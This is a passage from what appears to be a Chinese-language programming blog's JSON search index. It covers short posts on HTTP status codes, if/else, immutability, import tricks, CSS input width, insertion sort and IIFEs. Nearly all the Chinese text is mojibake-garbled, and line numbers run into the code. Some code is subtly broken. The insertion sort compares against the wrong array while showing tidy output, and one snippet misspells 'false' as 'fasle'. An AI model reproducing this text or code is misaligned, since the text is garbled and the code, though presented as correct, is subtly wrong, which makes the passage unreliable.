HTTPï¼Ÿå°±æ˜¯ä¸€å€‹ã€Œå”å®šã€ï¼Œä¹Ÿå¯ä»¥èªªæ˜¯ä¸€å¥—ã€Œæ¨™æº–ã€ï¼Œå°±åƒåƒåƒç‚ºè¨‚ä¾¿ç•¶åˆ¶å®šçš„æ¨™æº–ï¼Œå¤§å®¶éƒ½å¯ä»¥é€éé€™å€‹æ¨™æº–ä¾†åšæºé€šã€‚ å¸¸è¦‹çš„ HTTP Method GET è«‹æ±‚å®Œæ•´è³‡æ–™ HEAD åªè«‹æ±‚ header è³‡æ–™ POST å‚³é€è³‡æ–™åˆ° server PUT æ›´æ–°è³‡æ–™å…§å®¹ï¼ˆæ•´ç­†å–ä»£ï¼‰ PATCH æ›´æ–°è³‡æ–™å…§å®¹ï¼ˆåªå–ä»£éƒ¨åˆ†ï¼‰ DELETE åˆªé™¤æŒ‡å®šè³‡æ–™ OPTIONS æŸ¥çœ‹æŒ‡å®š server æä¾›å“ªäº›æœå‹™ å¸¸è¦‹çš„ Status codeå¤§ç¯„åœï¼š 1xx è™•ç†ä¸­ç­‰ä¸€ä¸‹ ï¼ˆHold onï¼‰ 2xx æˆåŠŸ ï¼ˆHere you goï¼‰ 3xx ä½ å»å…¶ä»–åœ°æ–¹ ï¼ˆGo awayï¼‰ 4xx ç”¨æˆ¶ç«¯å‡ºéŒ¯ ï¼ˆYou fucked upï¼‰ 5xx ä¼ºæœå™¨å‡ºéŒ¯ ï¼ˆI fucked upï¼‰ ä¾‹å­ï¼š 100 =&gt; æˆ‘æœ‰æ”¶åˆ°ä½ çš„è«‹æ±‚ï¼Œè«‹ä½ ç¹¼çºŒç™¼ä¸‹ä¸€å€‹ requestã€‚ 200 =&gt; æˆåŠŸï¼Œå¯èƒ½æ˜¯å–å¾—è³‡æ–™æˆ–æ˜¯å‚³é€æˆåŠŸ 201 =&gt; æˆåŠŸå»ºç«‹è³‡æ–™ï¼ˆé€šå¸¸æ˜¯ POSTï¼‰ 202 =&gt; æˆ‘æ”¶åˆ°ä½ çš„è«‹æ±‚äº†ï¼Œä½†æˆ‘é‚„æ²’æœ‰è™•è£¡å®Œï¼ˆä¹Ÿä¸çŸ¥é“ä»€éº¼æ™‚å€™æœƒè™•ç†å®Œï¼‰ 204 =&gt; æˆåŠŸï¼Œä½†æˆ‘æ²’æœ‰ä»€éº¼æƒ³è·Ÿä½ å›æ‡‰çš„ï¼ˆä¾‹å¦‚ DELETEï¼‰ 206 =&gt; æˆåŠŸï¼ˆç™¼ç”Ÿåœ¨ Client åªè«‹æ±‚ä¸€éƒ¨åˆ†çš„è³‡æ–™ï¼‰ 300 =&gt; æœ‰ä¸€å€‹ä»¥ä¸Šçš„å›æ‡‰çµæœï¼Œä½ æˆ–æˆ‘æŒ‘å‡ºå…¶ä¸­ä¸€å€‹ï¼ˆæ²’æœ‰æ˜ç¢ºè¦ç¯„ï¼‰ 301 =&gt; æ°¸ä¹…æ¬å®¶ï¼Œä¸‹æ¬¡ä¸æœƒå†å»åŸå®¶ï¼Œç›´æ¥å»æ–°å®¶ 302 =&gt; æš«æ™‚æ¬å®¶ï¼Œä¸‹æ¬¡é‚„æ˜¯æœƒå…ˆå»åŸå®¶ï¼Œå†æ±ºå®šå»å“ª 303 =&gt; ä¸æœƒå‚³ Location çµ¦ä½ ï¼Œè€Œæ˜¯ç›´æ¥å¹«ä½ é‡æ–°å°å‘åˆ°æŸå€‹åœ°æ–¹ï¼ˆé€šå¸¸åœ¨ POST æˆåŠŸå¾Œï¼‰ 304 =&gt; å®¢æˆ¶ç«¯æœ‰ç·©å­˜æª”æ¡ˆï¼ˆå« If-Modified-Since çš„ request headerï¼‰ï¼Œå¯ä»¥ç¯€çœå‚³è¼¸æµé‡ 400 =&gt; èªæ³•éŒ¯èª¤ or è«‹æ±‚å¤ªå¤§ 401 =&gt; æ²’é€šéèº«åˆ†é©—è­‰ 403 =&gt; ä½ æ²’æœ‰æ¬Šé™å­˜å–é€™å€‹è³‡æº 404 =&gt; æ²’æœ‰ä½ è¦çš„æ±è¥¿ 405 =&gt; ä¼ºæœå™¨ä¸å…è¨±ä½ ä½¿ç”¨çš„ HTTP Method 410 =&gt; æ±è¥¿æ›¾ç¶“åœ¨ï¼Œä½†ç¾åœ¨å·²ç¶“ä¸åœ¨äº†ï¼ˆæ°¸ä¹…ï¼‰ï¼Œè«‹ä½ è‡ªå·±å»åˆ¥çš„åœ°æ–¹æ‰¾ 422 =&gt; é€šå¸¸ç™¼ç”Ÿåœ¨ POSTï¼Œå¯èƒ½æ˜¯å‚³é€çš„å…§å®¹ä¸å°ã€‚ 429 =&gt; è«‹æ±‚å¤ªå¤šå•¦ï¼Œè¶…éè«‹æ±‚æ•¸é‡çš„æœ€å¤§é™åˆ¶ã€‚ 415 =&gt; ä½ è«‹æ±‚çš„è³‡æ–™æ ¼å¼ä¼ºæœå™¨æ²’æœ‰æä¾›ï¼ˆä¾‹å¦‚ Content-Type ä¸å°ï¼‰ 440 =&gt; ä½ çš„é€£ç·šé€¾æ™‚å•¦ï¼Œé‡æ–°ç™»å…¥ä¸€éå†ä¾†å§ã€‚ 414 =&gt; ä½ çš„ URL å¤ªé•·å•¦ï¼ˆé€šå¸¸æ˜¯ GET çš„ query å¤ªé•·çš„é—œä¿‚ï¼Œå¯ä»¥æ”¹ç”¨ POST ä¾†è§£æ±ºï¼‰ 500 =&gt; æœªé æ–™çš„éŒ¯èª¤ 503 =&gt; ç¶­è­·ä¸­æˆ–éè¼‰ï¼ˆæä¾›æ¯” 500 æ›´æ˜ç¢ºä¸€é»çš„è³‡è¨Šï¼Œåƒæ˜¯ã€Œå¤šä¹…å¾Œæœƒå¥½ã€ä¹‹é¡çš„ï¼‰ è£œå……ï¼HTTP åªæ˜¯å…¶ä¸­ä¸€ç¨®äº¤æ›è³‡æ–™çš„æ–¹å¼ä»¥å‚³ç´™æ¢çš„ä¾‹å­ä¾†èªªï¼Œå¯ä»¥æŠŠã€Œè¨‚ä¾¿ç•¶ã€çš„æ ¼å¼æƒ³æˆæ˜¯éµå¾ª HTTP é€™å€‹å”è­°ä¾†é€²è¡Œï¼š 1234GETé€é”æ™‚é–“ï¼šç¬¬å››å ‚é›è…¿é£¯ 5é›æ’é£¯ 2 ä½†å¦‚æœæ˜¯ã€Œå€Ÿç±ƒçƒã€ï¼Œå°±ä¸éœ€è¦æ¡å– HTTP å”è­°ä¾†é€²è¡Œï¼š 12Aï¼šå€Ÿäº”é¡†ç±ƒçƒBï¼šå¥½ æ‰€ä»¥ HTTP åªæ˜¯å…¶ä¸­ä¸€ç¨®äº¤æ›è³‡æ–™çš„æ–¹å¼ï¼Œä¸¦ä¸ä»£è¡¨ã€Œåªèƒ½ç”¨é€™ç¨®æ–¹å¼ã€ä¾†é€²è¡Œã€‚å°±è·Ÿ TCPã€UDP ä¸€æ¨£ï¼Œä»–å€‘åªæ˜¯å…©ç¨®ä¸åŒçš„å”è­°ï¼Œä½ å¯ä»¥æ ¹æ“šè‡ªå·±çš„éœ€æ±‚ä¾†æ±ºå®šè¦ç”¨å“ªä¸€ç¨®å”è­°ï¼Œè€Œä¸æ˜¯ä¸€å®šè¦ç”¨ç‰¹å®šå“ªç¨®å”è­°æ‰æ˜¯æ­£ç¢ºçš„ã€‚ æ‰€ä»¥ä½ ç•¶ç„¶ä¹Ÿå¯ä»¥è‡ªå·±å®šç¾©ä¸€å€‹å”è­°ä¾†æ±ºå®šæ€éº¼äº¤æ›è³‡æ–™ï¼Œä¸è¦è¢« HTTP çš„æ–¹å¼çµ¦ä¾·é™ä½äº†ã€‚","link":"/2022/01/05/http-introduction/"},{"title":"if è·Ÿ if else å¯èƒ½æœƒçŠ¯çš„éŒ¯èª¤","text":"ä½ è¸©åˆ°é›·äº†å—ï¼Ÿ åˆ†æ¸…æ¥šä½¿ç”¨çš„æ™‚æ©Ÿå¦‚æœæœ‰å¤šå€‹ if ï¼Œä»£è¡¨é€™äº› if ä¹‹é–“ã€Œæ²’æœ‰é—œè¯æ€§ã€ï¼Œä½†åœ¨ if else çš„æ™‚å€™æ˜¯ã€Œæœ‰é—œè¯æ€§ã€çš„ã€‚åƒè€ƒé€™å€‹ä¾‹å­ï¼š 12345678var age = 70if (age &gt;= 65) { console.log('è€äºº')} else if (age &gt;= 30) { console.log('å¹´è¼•äºº')} else if (age &gt;= 10) { console.log('å°å­©')} age çš„å€¼æ˜¯ 70ï¼Œå¦‚æœåªæœ‰å¯« if çš„è©±ï¼Œage æœƒç¬¦åˆæ¯ä¸€å€‹æ¢ä»¶ã€‚ï¼ˆå¤§æ–¼ 65ï¼Œå¤§æ–¼ 30ï¼Œå¤§æ–¼ 10ï¼‰ æ‰€ä»¥ if else çš„æ„ç¾©åœ¨æ–¼ï¼šåªæœ‰åœ¨ç¬¬ä¸€å€‹ ifã€Œæ²’æœ‰é€šéã€æ™‚ï¼Œæ‰æœ‰æ©Ÿæœƒé€²åˆ°ä¸‹ä¸€å€‹ else if åˆ¤æ–·å¥ï¼Œ åªæœ‰å¯« if çš„æƒ…æ³ï¼š 12345678910var age = 70if (age &gt;= 65) { console.log('è€äºº')}if (age &gt;= 30) { console.log('å¹´è¼•äºº')}if (age &gt;= 10) { console.log('å°å­©')} é€™æ¨£å­å¯«æœƒå¾—åˆ°çš„çµæœæœƒæ˜¯ï¼šè€äºº å¹´è¼•äºº å°å­©ã€‚ é€šå¸¸ä¸å¯«æˆ if else çš„æƒ…æ³æ˜¯ä»£è¡¨ã€Œæœ‰ä¸€è¡Œä¸ç®¡æ€æ¨£éƒ½è¦åŸ·è¡Œã€ï¼š 1234567var i = 1while (i &lt;= 10) { if (i&amp;1) { console.log(i,'æ˜¯å¥‡æ•¸') } console.log(i++)} è¼¸å‡ºçµæœï¼š 1234567891011121314151 æ˜¯å¥‡æ•¸123 æ˜¯å¥‡æ•¸345 æ˜¯å¥‡æ•¸567 æ˜¯å¥‡æ•¸789 æ˜¯å¥‡æ•¸910 é€™å€‹ä¾‹å­æœ‰é»çˆ›ï¼Œå› ç‚ºæˆ‘ä¸€æ™‚æƒ³ä¸åˆ°æ›´å¥½çš„ç¯„ä¾‹ã€‚ç¸½ä¹‹æƒ³å‘Šè¨´ä½ çš„æ˜¯ console.log(i++) é€™è¡Œä¸ç®¡æ€æ¨£éƒ½æœƒè¢«åŸ·è¡Œï¼Œæ‰€ä»¥æ¯ä¸€åœˆéƒ½æœƒå°å‡º iï¼Œè€Œä¸”ç•¶ i æ˜¯å¥‡æ•¸æ™‚æœƒåœ¨å¤šå°å‡ºä¸€æ¬¡ i æ˜¯å¥‡æ•¸ã€‚","link":"/2021/12/17/if-and-if-else-problem/"},{"title":"if çš„æ¼”åŒ–å²","text":"å¾ if åˆ° if else åœ¨åˆ° else ifã€‚ æˆé•·éç¨‹å‡è¨­æ¢ä»¶ï¼š age &gt;= 65ï¼Œè€äºº 65 &gt; age &gt;= 20ï¼Œå¹´è¼•äºº 20 &gt; ageï¼Œå°å­© æœ€åŸå§‹1234567891011var age = 70if (age &gt;= 65) { console.log('è€äºº')}if (age &lt; 65 &amp;&amp; age &gt;= 20) { console.log('å¹´è¼•äºº')}if (age &lt; 20) { console.log('å°å­©')} æ¯å€‹ if ä¹‹é–“æ²’æœ‰é—œè¯æ€§ï¼Œæ‰€ä»¥æ¢ä»¶å°±å¾—å¯«çš„éå¸¸æ˜ç¢ºï¼Œä¸ç„¶åŸ·è¡Œé‚è¼¯ä¸Šæœƒå‡ºéŒ¯ã€‚ é€²åŒ–æˆ if else12345678910// é€²åŒ–æˆ if else if (age &gt;= 65) { console.log('è€äºº')} else { if (age &gt;= 20) { console.log('å¹´è¼•äºº') } else { console.log('å°å­©') }} if else è®“åˆ¤æ–·æµç¨‹ä¹‹é–“å…·æœ‰é—œè¯æ€§ï¼Œè®“æ¢ä»¶è®Šå¾—ç°¡æ½”äº†ï¼å”¯ä¸€çš„ç¼ºé»æ˜¯å¤ªéå·¢ç‹€ï¼Œä¸æ˜¯å¾ˆå¥½é–±è®€ã€‚ é€²åŒ–æˆ else if12345678// é€²åŒ–æˆ else if if (age &gt;= 65) { console.log('è€äºº')} else if (age &gt;= 20) { console.log('å¹´è¼•äºº')} else if (age &lt; 20){ console.log('å°å­©')} éŒ¦ä¸Šé‚„è¦å†æ·»èŠ±ï¼Œelse if ä¸åªä¿ç•™æ¢ä»¶ä¹‹é–“çš„é—œè¯æ€§ï¼Œä¹Ÿè®“å¯è®€æ€§è®Šå¾—æ›´å¥½ï¼ åŒå ´åŠ æ˜ ï¼ˆif çš„å°æŠ€å·§ï¼‰12345678var score = 60var isPass = nullif (score &gt;= 60) { isPass = true} else { isPass = fasle} å…¶å¯¦æœ‰æ›´ç°¡å–®çš„å¯«æ³•ï¼š 12var score = 60var isPass = (score &gt;= 60) å› ç‚º score &gt;= 60 çš„é‹ç®—å€¼æ­£å¥½è·Ÿ isPass è¦è¨­å®šçš„å€¼åŒï¼Œæ‰€ä»¥æ‰å¯ä»¥é€™æ¨£å¯«ã€‚","link":"/2021/12/17/if-condition/"},{"title":"Immutable çš„è§€å¿µ","text":"ç©å£è…¦è¢‹çš„æ±è¥¿ã€‚ å…¶å¯¦å°±è·Ÿåœ¨ å¾ Object çš„ç­‰è™Ÿä¾†çœŸæ­£ç†è§£è®Šæ•¸ æåˆ°çš„æ¦‚å¿µå¾ˆé¡ä¼¼ã€‚ Immutable ä¸å¯è®Šé™¤äº†ç‰©ä»¶ä»¥å¤–çš„è³‡æ–™å‹æ…‹éƒ½æ˜¯å±¬æ–¼ã€Œimmutableã€ï¼Œå°±æ˜¯å€¼æ²’è¾¦æ³•è¢«æ”¹è®Šã€‚ ä¾‹å¦‚èªªï¼š 123var a = 'hello'a.toUpperCase()console.log(a) // hello é€™æ¨£å¯«æ˜¯çµ•å°æ²’è¾¦æ³•æ”¹è®Š a çš„å€¼çš„ã€‚å°±è·Ÿä½ æ²’è¾¦æ³•åœ¨ function è£¡é¢å»æ”¹å¤–é¢è®Šæ•¸çš„å€¼æ˜¯ä¸€æ¨£çš„é“ç†ã€‚é€™å€‹å°±å«åšã€Œä¸å¯è®Šã€ã€‚ æ‰€ä»¥ä½ çµ•å°ä¸æœƒçœ‹åˆ°ç”¨ String.method() Number.method() å°±å¯ä»¥åŸè®Šæ•¸çš„å€¼çš„æ±è¥¿ï¼Œè€Œéƒ½æ˜¯ç”¨å›å‚³çš„æ–¹å¼ä¾†ç”¢ç”Ÿä¸€å€‹æ–°çš„å€¼ã€‚ Mutable å¯è®Šåªæœ‰ç‰©ä»¶ï¼Œé™£åˆ—æ˜¯å¯ä»¥è¢«æ”¹è®Šçš„ï¼Œé—œéµå­—ï¼šã€ŒMutator methodsã€ ä¸€å€‹æœ€å¸¸è¦‹çš„ä¾‹å­ï¼š 1234var arr = [1, 2, 3]var res = arr.push(1, 2)console.log(arr) // ä¿®æ”¹åŸé™£åˆ—console.log(res) // å›å‚³å€¼ ä¸€å€‹é™£åˆ—ä½¿ç”¨ push å¾ŒåŸæœ¬çš„å…§å®¹å°±æœƒè¢«æ”¹è®Šã€‚æ‰€ä»¥ä½ ä¸æœƒç”¨çœ‹åˆ°ç”¨ç¬¬äºŒè¡Œçš„å¯«æ³•ä¾†ï¼Œé‚£æ¨£å­åªæœƒå¾—åˆ° push åŸ·è¡Œå®Œçš„å›å‚³å€¼ï¼ˆé™£åˆ—çš„é•·åº¦ï¼‰ã€‚ å…¶ä»–é‚„æœ‰åƒæ˜¯ Array.spliceã€Array.sort() ä¹Ÿéƒ½æ˜¯ä¸€æ¨£çš„ä¾‹å­ã€‚ è®“ä¸€å€‹ç‰©ä»¶è®Šæˆä¸å¯è®Šçš„æ–¹æ³•Object.freeze(obj) å¯ä»¥è®“ä¸€å€‹ç‰©ä»¶æˆ–é™£åˆ—è®Šæˆ immutableï¼š 123var arr = [1, 2, 3]Object.freeze(arr)arr.splice(1, 1, 'hi') // TypeError: Cannot assign to read only property '1' of object '[object Array]' å¦‚æœä½ çœŸçš„æœ‰é€™ç¨®è¦è®“ã€Œç‰©ä»¶ã€è®Šæˆä¸å¯è®Šçš„éœ€æ±‚ï¼Œå¯ä»¥ä½¿ç”¨é€™å€‹å…§å»ºæ–¹æ³•ã€‚ï¼ˆä½†æˆ‘ç›®å‰ä¹Ÿä¸çŸ¥é“æœ‰ä»€éº¼æƒ…æ³æœƒéœ€è¦é€™æ¨£åšå°±æ˜¯äº†ï¼‰","link":"/2021/12/20/immutable/"},{"title":"ä¸€å€‹ import çš„å°æŠ€å·§","text":"ç†Ÿèƒ½ç”Ÿå·§ã€‚ ç°¡è¿°é€™å€‹æ˜¯æˆ‘åœ¨å·¥ä½œæ™‚ç¢°åˆ°çš„å•é¡Œï¼Œå°±æ˜¯æœƒç¢°åˆ°æœ‰ä¸€å¤§å †æ±è¥¿è¦ import æ™‚ï¼Œä½ çš„ code æœƒé•·å¾—åƒé€™æ¨£ï¼š 123456789101112131415161718192021222324// App.jsimport Comp1 from \"./components/Comp1\";import Comp2 from \"./components/Comp2\";import Comp3 from \"./components/Comp3\";import Comp4 from \"./components/Comp4\";import Comp5 from \"./components/Comp5\";import Comp6 from \"./components/Comp6\";// ...ç•¥function App () { return ( &lt;Router&gt; &lt;Routes&gt; &lt;Route path=\"path1\" element={&lt;Comp1 /&gt;} /&gt; &lt;Route path=\"path2\" element={&lt;Comp2 /&gt;} /&gt; &lt;Route path=\"path3\" element={&lt;Comp3 /&gt;} /&gt; &lt;Route path=\"path4\" element={&lt;Comp4 /&gt;} /&gt; &lt;Route path=\"path5\" element={&lt;Comp5 /&gt;} /&gt; &lt;Route path=\"path6\" element={&lt;Comp6 /&gt;} /&gt; {/* ...ç•¥ */} &lt;/Routes&gt; &lt;/Router&gt; )} é€™æ™‚å€™ App.js å¯èƒ½å°±æœƒæœ‰å¥½å¹¾ç™¾è¡Œï¼Œä½†æœ‰ 50% éƒ½æ˜¯åœ¨ import é‚£äº›å…ƒä»¶ã€‚ å¦‚æœä½ è¦ºå¾—é€™æ¨£å¾ˆä¸é †çœ¼çš„è©±ï¼Œå…¶å¯¦å¯ä»¥åˆ©ç”¨ä¸€ç¨®å°æŠ€å·§ä¾†æŠŠå…ƒä»¶çš„éƒ¨åˆ†çµ¦æ‹†å‡ºå»ã€‚ é€™é‚Šæˆ‘å€‘è¦æ–°å»ºä¸€éš» AllCom.jsï¼Œé€™å€‹æª”æ¡ˆåªè² è²¬ç”¨ä¾† import é‚£äº›å…ƒä»¶ï¼š 1234567891011121314151617import Comp1 from \"./components/Comp1\";import Comp2 from \"./components/Comp2\";import Comp3 from \"./components/Comp3\";import Comp4 from \"./components/Comp4\";import Comp5 from \"./components/Comp5\";import Comp6 from \"./components/Comp6\";// ...ç•¥export { Comp1, Comp2, Comp3, Comp4, Comp5, Comp6, // ...ç•¥} é€™æ¨£å­åšä»¥å¾Œå‘¢ï¼ŒApp.js å°±å¯ä»¥æ”¹å¯«æˆé€™æ¨£å­ï¼š 123456789101112131415161718// ç¾åœ¨åªè¦ä¸€è¡Œå°±æå®šimport * as All from \"./components/AllCom\";function App () { return ( &lt;Router&gt; &lt;Routes&gt; &lt;Route path=\"path1\" element={&lt;All.Comp1 /&gt;} /&gt; &lt;Route path=\"path2\" element={&lt;All.Comp2 /&gt;} /&gt; &lt;Route path=\"path3\" element={&lt;All.Comp3 /&gt;} /&gt; &lt;Route path=\"path4\" element={&lt;All.Comp4 /&gt;} /&gt; &lt;Route path=\"path5\" element={&lt;All.Comp5 /&gt;} /&gt; &lt;Route path=\"path6\" element={&lt;All.Comp6 /&gt;} /&gt; {/* ...ç•¥ */} &lt;/Routes&gt; &lt;/Router&gt; )} é›–ç„¶å¾ˆç°¡çŸ­ï¼Œä½†é€™æ˜¯è »å¯¦ç”¨çš„æ–¹å¼ã€‚","link":"/2022/06/16/import-trick/"},{"title":"ç”¨ in é‹ç®—å­æª¢æŸ¥ Object çš„å±¬æ€§","text":"åšé¡Œç›®æ™‚å­¸åˆ°çš„ã€‚ ç°¡è¿°in é™¤äº†ç”¨åœ¨ for...in ä»¥å¤–ï¼Œé‚„å¯ä»¥ç”¨åœ¨ if...inã€‚ å…©è€…çš„æ¦‚å¿µå·®ä¸å¤šï¼Œåœ¨è¿´åœˆè£¡çš„ in æ˜¯ç”¨ä¾†ã€Œéæ­·ç‰©ä»¶çš„ keyã€ï¼Œè€Œ if ä¸­çš„ in æ˜¯ç”¨ä¾†æª¢æŸ¥ã€Œç‰©ä»¶è£¡æœ‰æ²’æœ‰é€™å€‹ keyã€ï¼Œæœ‰çš„è©±å›å‚³ trueï¼Œå¦å‰‡ falseã€‚ é™„è¨»ï¼šä½†æ²’æœ‰ if...of çš„å¯«æ³•å“¦ã€‚ ä¾†ç›´æ¥çœ‹ä¾‹å­ï¼š 12345678const obj = { name: 'PeaNu', age: 20, gender: 'man'}if ('name' in obj) console.log('has name'); if ('age' in obj) console.log('has age');if ('gender' in obj) console.log('has gender'); å°±é€™æ¨£ï½","link":"/2022/03/17/in-operator/"},{"title":"é—œæ–¼ <input> çš„å¯¬åº¦å•é¡Œ","text":"å¿ä½ å¾ˆä¹…äº†ï¼Œä»Šå¤©å°±æŠŠä½ çµ¦è§£æ±ºï¼ æƒ…å¢ƒå¦‚æœä½ æƒ³åšé€™å€‹ç•«é¢ï¼š ä½ å¤§æ¦‚æœƒé€™æ¨£å¯«ï¼š 1234567891011121314151617&lt;style&gt;.input-block { display: flex;}.input-block__text { flex-shrink: 0;}.input-block__input { flex: 1;}&lt;/style&gt;&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;å§“åï¼š&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\"&gt;&lt;/div&gt; é€™æ™‚å€™ä½ å°±æœƒç™¼ç¾ &lt;input&gt; çš„å¯¬åº¦æ²’è¾¦æ³•ç¸®åˆ°å¾ˆå°ï¼š é•·è©±çŸ­èªªåœ¨ä¸Šé¢çš„ä¾‹å­ä½ å¯èƒ½æœƒæƒ³èªªåŠ ä¸Š flex-shrink: 0 æˆ– min-width: 0 ä¾†è™•ç†ï¼Œä½†å¾ˆæŠ±æ­‰ï¼Œéƒ½æ²’æœ‰ç”¨å“¦ï¼ å…¶å¯¦ &lt;input&gt; æœƒè‡ªå¸¶ä¸€å€‹å¯¬åº¦ï¼Œæ‡‰è©²æ˜¯æ¨™ç±¤ä¸Šçš„ size å±¬æ€§ï¼š 1&lt;input type=\"text\" size=\"20\"&gt; åœ¨ Chrome ä¸Šå¤§æ¦‚æœƒæ˜¯ 200px çš„å¯¬ï¼Œæ‰€ä»¥å¦‚æœä½ æ²’æœ‰è¨­å®š width çš„è©±ï¼Œç•¶ &lt;input&gt; è¢«ç¸®æ”¾åˆ°å¾ˆå°çš„æ™‚å€™ï¼Œä»–å°±æœƒå›ºå®šåœ¨ size çš„å¯¬åº¦ã€‚ è‡³æ–¼ Flex çš„éƒ¨åˆ†æ¯”è¼ƒç‰¹æ®Šï¼Œflex: 1 ç¢ºå¯¦å¯ä»¥è®“å…ƒç´ åƒåˆ°å‰©é¤˜ç©ºé–“ä¾†å¡«æ»¿å®¹å™¨ï¼Œä½†å¦‚æœæ²’æœ‰è¨­å®š width å°±æœƒæœ‰ä¸Šé¢çš„å•é¡Œã€‚ è§£æ±ºè¾¦æ³•è¨˜ä½ä¸€å€‹è¦è¨£å°±å¥½ï¼Œå¦‚æœä½ è¦è®“ &lt;input&gt; å¯¬åº¦å¯ä»¥è‡ªé©æ‡‰ï¼Œé‚£å°±å¹«ä»–åŠ ä¸Š widthï¼š 1234567891011121314151617&lt;style&gt;.input-block { display: flex;}.input-block__text { flex-shrink: 0;}.input-block__input { flex: 1; width: 100%;}&lt;/style&gt;&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;å§“åï¼š&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\"&gt;&lt;/div&gt; å¦‚æœæ˜¯åœ¨ block-level çš„ç©ºé–“ä¸­ä¹Ÿæ˜¯åŒæ¨£é“ç†ï¼š 12345678910111213&lt;style&gt;.input-block { display: block;}.input-block__input { /* é è¨­çš„æƒ…æ³ */ width: auto;}&lt;/style&gt;&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;å§“åï¼š&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\" size=\"20\"&gt;&lt;/div&gt; æŠŠ &lt;input&gt; åŠ ä¸Š widthï¼š 123456789101112&lt;style&gt;.input-block { display: block;}.input-block__input { width: 100%;}&lt;/style&gt;&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;å§“åï¼š&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\" size=\"20\"&gt;&lt;/div&gt;","link":"/2022/01/19/input-width-problem/"},{"title":"æ’å…¥æ’åºæ³•ï¼ˆInsertion-sortï¼‰","text":"å¾ˆæ—¥å¸¸çš„æ¼”ç®—æ³•ï¼Œä½†å¯«æˆ Code å»æ ¼å¤–æŠ½è±¡ã€‚ æ¦‚å¿µè·Ÿç©æ’²å…‹ç‰Œä¸€æ¨£ï¼Œå…ˆæŠŠä¸€å¼µç‰ŒæŠ½å‡ºä¾†ï¼Œæ¥è‘—è·Ÿå‰é¢æ’å¥½çš„ç‰Œæ¯”å¤§å°ï¼Œæœ€å¾Œæ’åˆ°æ­£ç¢ºçš„ä½ç½®ã€‚ æµç¨‹åœ–ï¼š å¯¦ä½œ12345678910111213141516171819202122232425function insertionSort(arr) { // æŠŠç¬¬ä¸€å€‹æ•¸å­—æ”¾åˆ°æ’åºå¥½çš„æ•¸åˆ— let sortedNumbers = [arr[0]] // éæ­·æ‰€æœ‰æ•¸å­—ï¼ˆå¾ç¬¬äºŒå€‹æ•¸å­—é–‹å§‹ï¼‰ for (let i=1; i&lt;arr.length; i++) { // æŠ½å‡ºä¾†çš„æ•¸å­— const extractNumber = arr[i] // è¦æ’å…¥çš„ä½ç½®ï¼ˆåˆå§‹å€¼ç‚ºæœ€å¾Œé¢ï¼‰ let insertIndex = sortedNumbers.length // éæ­·å·²æ’åºå¥½çš„æ•¸åˆ—ï¼ˆç”±å¾Œåˆ°å‰ï¼‰ for (let j=sortedNumbers.length-1; j&gt;=0; j--) { // å¦‚æœæŠ½å‡ºä¾†çš„æ•¸å­— &lt; æ’åºå¥½çš„æ•¸å­—ï¼Œ if (extractNumber &lt; arr[j]) { // æŠŠè¦æ’å…¥çš„ä½ç½®å¾€å‰ç§»ä¸€ä½ insertIndex -= 1 } } // æŠŠæŠ½å‡ºä¾†çš„æ•¸å­—æ’å…¥åˆ°æ­£ç¢ºä½ç½® sortedNumbers.splice(insertIndex, 0, extractNumber) } // å›å‚³çµæœ return sortedNumbers}const numbers = [5, 44, 23, 21, 64, 15]console.log(insertionSort(numbers)) // [ 5, 15, 21, 23, 44, 64 ] è©³ç´°æ­¥é©Ÿï¼š 12345678910111213141516171819202122232425262728293031323334extractNumber: 44compare: 5insertIndex: 1sortedNumbers: [ 5, 44 ]extractNumber: 23compare: 44compare: 5insertIndex: 1sortedNumbers: [ 5, 23, 44 ]extractNumber: 21compare: 44compare: 23compare: 5insertIndex: 1sortedNumbers: [ 5, 21, 23, 44 ]extractNumber: 64compare: 44compare: 23compare: 21compare: 5insertIndex: 4sortedNumbers: [ 5, 21, 23, 44, 64 ]extractNumber: 15compare: 64compare: 44compare: 23compare: 21compare: 5insertIndex: 1sortedNumbers: [ 5, 15, 21, 23, 44, 64 ]","link":"/2022/01/17/insertion-sort/"},{"title":"åŸ·è¡Œ IIFE çš„ä¸‰ç¨®æ–¹å¼","text":"æ‡¶äººåŒ…ä¸€ä¸‹ã€‚ åŸç†ç°¡è¿°é™¤äº†ç†Ÿæ‚‰çš„é€™å€‹æ–¹æ³•ï¼š 123(function havename () { console.log('IIFE!')})() é‚„æœ‰ä»¥ä¸‹é€™äº›æ–¹æ³•ï¼š 123456789~function havename () { console.log('IIFE!')}()-function havename () { console.log('IIFE!')}()+function havename () { console.log('IIFE!')}() å‚™è¨»ï¼šæ•…æ„å¯«æˆå‘½åå‡½å¼æ˜¯å› ç‚º IIFE æ²’æœ‰é™å®šå¿…é ˆæ˜¯åŒ¿åå‡½å¼ã€‚ å…¶å¯¦åŸç†éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œè®“ function è®Šæˆæ˜¯ä¸€å€‹ã€Œé‹ç®—å¼ï¼ˆExpressionï¼‰ã€ï¼Œåªæ˜¯é€™äº›ã€Œä¸€å…ƒé‹ç®—å­ï¼ˆUnary operatorï¼‰ã€ä¹Ÿæœ‰ç›¸åŒçš„ä½œç”¨ã€‚","link":"/2022/01/22/invoke-IIFE-in-3-way/"},{"title":"åˆ¤æ–·ç­‰æ¯”æ•¸åˆ—","text":"ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œä¹Ÿæ˜¯è »æœ‰è¶£çš„ä¸€é¡Œã€‚ å¸¸çŠ¯çš„éŒ¯èª¤å¦‚æœçœ‹å®Œé¡Œç›®ç›´æ¥é–‹å§‹åšï¼Œé€šå¸¸æˆ‘å€‘æœƒé€™æ¨£å­å¯«ï¼š 12345678function isSequence(arr) { for(let i=1; i&lt;arr.length; i++) { // åˆ¤æ–·ç¬¬äºŒå€‹å…ƒç´  / ç¬¬ä¸€å€‹å…ƒç´  !== ç¬¬ä¸‰å€‹å…ƒç´  / ç¬¬äºŒå€‹å…ƒç´  if(arr[i]/arr[i-1] !== arr[i+1]/arr[i]) return false } return true}console.log(isSequence([1, 2, 4, 8, 16])) // false ç‚ºä»€éº¼æœ€å¾Œæ˜¯ falseï¼Ÿ å› 